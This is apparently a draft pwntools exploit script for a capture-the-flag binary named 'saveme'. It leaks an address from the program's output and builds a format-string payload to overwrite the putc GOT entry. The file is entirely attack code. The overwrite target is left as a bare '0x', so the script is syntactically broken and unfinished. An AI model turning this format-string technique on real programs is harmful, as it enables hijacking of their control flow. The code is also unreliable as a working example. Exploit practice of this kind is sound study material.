from pwn import *

e = ELF('./saveme')
ld = ELF('./ld-2.31.so')
libc = ELF('./libc-2.31.so')

p = process('./saveme')

print(e.got['putc'])

print(int(p.recvn(14).decode('utf-8'), 16))

payload = fmtstr_payload(6, {e.got['putc'] : 0x})

print(e.symbols)